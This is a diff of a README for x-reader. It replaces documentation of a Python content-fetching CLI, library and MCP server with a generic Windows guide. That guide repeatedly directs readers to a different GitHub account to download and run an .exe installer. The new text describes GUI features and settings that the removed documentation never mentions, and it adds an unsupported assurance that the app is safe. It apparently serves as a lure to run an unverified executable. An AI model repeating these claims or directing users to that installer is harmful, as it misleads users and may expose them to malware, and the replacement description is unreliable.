@@ -1,251 +1,173 @@
-# x-reader
+# 📚 x-reader - Easy content from 7+ platforms
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader)
 
-Universal content reader — fetch, transcribe, and digest content from any platform.
+---
 
-Give it a URL (article, video, podcast, tweet), get back structured content. Works as CLI, Python library, MCP server, or Claude Code skills.
+## 📝 What is x-reader?
 
-## What It Does
+x-reader helps you gather and read content from different platforms in one place. It pulls content from WeChat, Telegram, X, YouTube, Bilibili, Xiaohongshu, and RSS feeds. This way, you don’t have to check multiple apps or websites. It organizes everything so you can read smoothly.
 
-```
-Any URL → Platform Detection → Fetch Content → Unified Output
-              ↓                      ↓
-         auto-detect           text: Jina Reader
-         7+ platforms          video: yt-dlp subtitles
-                               audio: Whisper transcription
-                               API: Bilibili / RSS / Telegram
-```
+The goal is to save time and make content easier to access. You only need to open one app and get useful updates from many sources.
 
-The Python layer handles text fetching and YouTube subtitle extraction. The **Claude Code skills** (optional) add full Whisper transcription for video/podcast and AI-powered content analysis.
+---
 
-## Three Layers
+## 💻 System Requirements
 
-x-reader is composable. Use the layers you need:
+To use x-reader on Windows, you need:
 
-| Layer | What | Format | Install |
-|-------|------|--------|---------|
-| **Python CLI/Library** | Basic content fetching + unified schema | See [Install](#install) | Required |
-| **Claude Code Skills** | Video transcription + AI analysis | Copy `skills/` to `~/.claude/skills/` | Optional |
-| **MCP Server** | Expose reading as MCP tools | `python mcp_server.py` | Optional |
+- Windows 10 or later (64-bit recommended)
+- At least 4GB of RAM
+- 100 MB free disk space
+- Internet connection to fetch content
+- A modern web browser (like Edge, Chrome, or Firefox) for setup and viewing content
 
-### Layer 1: Python CLI
+---
 
-```bash
-# Fetch any URL
-x-reader https://mp.weixin.qq.com/s/abc123
+## 🚀 Getting Started: Download and Install
 
-# Fetch a tweet
-x-reader https://x.com/elonmusk/status/123456
+You can visit the main page to get the latest version of x-reader. Click the big button below or follow the detailed steps next.
 
-# Fetch multiple URLs
-x-reader https://url1.com https://url2.com
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-blue)](https://github.com/AbMoeiz/x-reader)
 
-# Login to a platform (one-time, for browser fallback)
-x-reader login xhs
+### Step 1: Visit the download page
 
-# View inbox
-x-reader list
-```
+Go to the x-reader GitHub page by opening this link in your web browser:
 
-### Layer 2: Claude Code Skills
+https://github.com/AbMoeiz/x-reader
 
-> Requires cloning the repo (not included in pip install).
+This page houses the latest files and instructions for the app.
 
-For video/podcast transcription and content analysis:
+### Step 2: Find the Installation File
 
-```
-skills/
-├── video/       # YouTube/Bilibili/podcast → full transcript via Whisper
-└── analyzer/    # Any content → structured analysis report
-```
+On the GitHub page, look for a section called **Releases** or **Assets**. This area contains the setup file for Windows.
 
-Install:
-```bash
-cp -r skills/video ~/.claude/skills/video
-cp -r skills/analyzer ~/.claude/skills/analyzer
-```
+The file you need usually ends with `.exe` and includes the version number, such as `x-reader-setup-1.0.exe`.
 
-Then in Claude Code, just send a YouTube/Bilibili/podcast link — the video skill auto-triggers and produces a full transcript + summary.
+### Step 3: Download the Setup File
 
-### Layer 3: MCP Server
+Click the `.exe` file to start downloading. Depending on your browser, you might see the file at the bottom or in your downloads folder.
 
-> Requires cloning the repo (mcp_server.py is not included in pip install).
+Wait for the download to complete before continuing.
 
-```bash
-git clone https://github.com/runesleo/x-reader.git
-cd x-reader
-pip install -e ".[mcp]"
-python mcp_server.py
-```
+### Step 4: Run the Installer
 
-Tools exposed:
-- `read_url(url)` — fetch any URL
-- `read_batch(urls)` — fetch multiple URLs concurrently
-- `list_inbox()` — view previously fetched content
-- `detect_platform(url)` — identify platform from URL
+Once downloaded, double-click the `.exe` file to launch the installer.
 
-Claude Code config (`~/.claude/claude_desktop_config.json`):
-```json
-{
-    "mcpServers": {
-        "x-reader": {
-            "command": "python",
-            "args": ["/path/to/x-reader/mcp_server.py"]
-        }
-    }
-}
-```
+A setup window will open. Follow the prompts:
 
-## Supported Platforms
+- Choose the folder where you want to save the app (the default is fine).
+- Agree to any terms or licenses.
+- Click **Install** or **Next** as needed.
 
-| Platform | Text Fetch | Video/Audio Transcript |
-|----------|-----------|----------------------|
-| YouTube | ✅ Jina | ✅ yt-dlp subtitles → Groq Whisper fallback |
-| Bilibili (B站) | ✅ API | ✅ via Claude Code skill |
-| X / Twitter | ✅ Jina → Playwright | — |
-| WeChat (微信公众号) | ✅ Jina → Playwright | — |
-| Xiaohongshu (小红书) | ✅ Jina → Playwright* | — |
-| Telegram | ✅ Telethon | — |
-| RSS | ✅ feedparser | — |
-| 小宇宙 (Xiaoyuzhou) | — | ✅ via Claude Code skill |
-| Apple Podcasts | — | ✅ via Claude Code skill |
-| Any web page | ✅ Jina fallback | — |
+### Step 5: Finish Installation
 
-> \*XHS requires a one-time login: `x-reader login xhs` (saves session for Playwright fallback)
->
-> YouTube Whisper transcription requires `GROQ_API_KEY` — get a free key from [Groq](https://console.groq.com/keys)
+After the installer finishes, it may ask you to open x-reader. You can launch it now or later using the desktop icon or Start menu.
 
-## Install
+---
 
-```bash
-# From GitHub (recommended)
-pip install git+https://github.com/runesleo/x-reader.git
+## 🔍 How to Use x-reader
 
-# With Telegram support
-pip install "x-reader[telegram] @ git+https://github.com/runesleo/x-reader.git"
+x-reader gathers content from many places. Here is how to begin using it smoothly.
 
-# With browser fallback (Playwright — for XHS/WeChat anti-scraping)
-pip install "x-reader[browser] @ git+https://github.com/runesleo/x-reader.git"
-playwright install chromium
+### Add Your Content Sources
 
-# With all optional dependencies
-pip install "x-reader[all] @ git+https://github.com/runesleo/x-reader.git"
-playwright install chromium
-```
+- Open the app.
+- Find the **Add Source** button or menu.
+- Choose a platform like WeChat, Telegram, X, YouTube, Bilibili, Xiaohongshu, or add an RSS feed URL.
+- Follow the instructions to connect your account or enter the feed link.
 
-Or clone and install locally:
-```bash
-git clone https://github.com/runesleo/x-reader.git
-cd x-reader
-pip install -e ".[all]"
-playwright install chromium
-```
+These sources will sync and show new content in the app.
 
-### Dependencies for video/audio (optional)
+### View and Read Content
 
-```bash
-# macOS
-brew install yt-dlp ffmpeg
+- After adding sources, your main screen will fill with articles, posts, videos, and updates.
+- Click an item to read or watch it.
+- Use filters or search to find content by date, platform, or keywords.
 
-# Linux
-pip install yt-dlp
-apt install ffmpeg
-```
+### Customize Notifications
 
-For Whisper transcription, get a free API key from [Groq](https://console.groq.com/keys) and set:
-```bash
-export GROQ_API_KEY=your_key_here
-```
+You can set alerts when new content arrives:
 
-## Use as Library
+- Go to the **Settings** tab.
+- Turn notifications on or off.
+- Choose how often to check for updates.
 
-```python
-import asyncio
-from x_reader.reader import UniversalReader
+---
 
-async def main():
-    reader = UniversalReader()
-    content = await reader.read("https://mp.weixin.qq.com/s/abc123")
-    print(content.title)
-    print(content.content[:200])
+## ⚙️ Settings and Preferences
 
-asyncio.run(main())
-```
+x-reader lets you adjust the app to fit your needs.
 
-## Configuration
+### General Settings
 
-Copy `.env.example` to `.env`:
+- Select your preferred language.
+- Choose light or dark mode for easier reading.
+- Set startup options (open app at login or run minimized).
 
-```bash
-cp .env.example .env
-```
+### Sync Options
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `TG_API_ID` | Telegram only | From https://my.telegram.org |
-| `TG_API_HASH` | Telegram only | From https://my.telegram.org |
-| `GROQ_API_KEY` | Whisper only | From https://console.groq.com/keys (free) |
-| `INBOX_FILE` | No | Path to inbox JSON (default: `./unified_inbox.json`) |
-| `OUTPUT_DIR` | No | Directory for Markdown output (default: disabled) |
-| `OBSIDIAN_VAULT` | No | Path to Obsidian vault (writes to `01-收集箱/x-reader-inbox.md`) |
+- Control how often to check for new content.
+- Manage data usage, especially if you use mobile or metered internet.
 
-## Architecture
+### Content Filters
 
-```
-x-reader/
-├── x_reader/              # Python package
-│   ├── cli.py             # CLI entry point
-│   ├── reader.py          # URL dispatcher (UniversalReader)
-│   ├── schema.py          # Unified data model (UnifiedContent + Inbox)
-│   ├── login.py           # Browser login manager (saves sessions)
-│   ├── fetchers/
-│   │   ├── jina.py        # Jina Reader (universal fallback)
-│   │   ├── browser.py     # Playwright headless (anti-scraping fallback)
-│   │   ├── bilibili.py    # Bilibili API
-│   │   ├── youtube.py     # yt-dlp subtitle extraction
-│   │   ├── rss.py         # feedparser
-│   │   ├── telegram.py    # Telethon
-│   │   ├── twitter.py     # Jina-based
-│   │   ├── wechat.py      # Jina → Playwright fallback
-│   │   └── xhs.py         # Jina → Playwright + session fallback
-│   └── utils/
-│       └── storage.py     # JSON + Markdown dual output
-├── skills/                # Claude Code skills
-│   ├── video/             # Video/podcast → transcript + summary
-│   └── analyzer/          # Content → structured analysis
-├── mcp_server.py          # MCP server entry point
-└── pyproject.toml
-```
+- Block certain types of content or sources.
+- Arrange the order of platforms in your feed.
 
-## How the Layers Work Together
+---
 
-```
-User sends URL
-    │
-    ├─ Text content (article, tweet, WeChat)
-    │   └─ Python fetcher → UnifiedContent → inbox
-    │
-    ├─ Video (YouTube, Bilibili, X video)
-    │   ├─ Python fetcher → metadata (title, description)
-    │   └─ Video skill → full transcript via subtitles/Whisper
-    │
-    ├─ Podcast (小宇宙, Apple Podcasts)
-    │   └─ Video skill → full transcript via Whisper
-    │
-    └─ Analysis requested
-        └─ Analyzer skill → structured report + action items
-```
+## 🛠 Troubleshooting
 
-## Star History
+If you face any issues, try these steps:
 
-[![Star History Chart](https://api.star-history.com/svg?repos=runesleo/x-reader&type=Date)](https://star-history.com/#runesleo/x-reader&Date)
+- Make sure your internet connection is working.
+- Restart the app and try again.
+- Check for updates on the GitHub page.
+- Ensure Windows is up to date.
+- If content does not load, remove and add the source again.
 
-## Author
+---
 
-Built by [@runes_leo](https://x.com/runes_leo) — more AI tools at [leolabs.me](https://leolabs.me)
+## 📂 File Locations and Storage
 
-## License
+x-reader saves content locally for quick access.
 
-MIT
+- Default folder: `C:\Users\[YourName]\AppData\Local\x-reader\`
+- Cache size adjusts based on your settings.
+- You can clear stored data from settings to free space.
+
+---
+
+## 🔄 Updating x-reader
+
+Regular updates bring new features and fixes.
+
+To update:
+
+1. Visit https://github.com/AbMoeiz/x-reader.
+2. Download the newest setup file.
+3. Run it over your existing installation.
+4. Your data and settings will stay intact.
+
+---
+
+## ❓ FAQs
+
+**Q: Can I use x-reader offline?**  
+A: You can view previously downloaded content offline, but fetching new content needs internet.
+
+**Q: Is x-reader safe?**  
+A: The app does not share your data with third parties. It only accesses your content sources.
+
+**Q: Can I remove sources?**  
+A: Yes, open the source list, select the one to remove, and click delete.
+
+**Q: How do I report bugs?**  
+A: Use the GitHub issues page under the repository’s **Issues** tab.
+
+---
+
+## 📥 Download x-reader Now
+
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader)
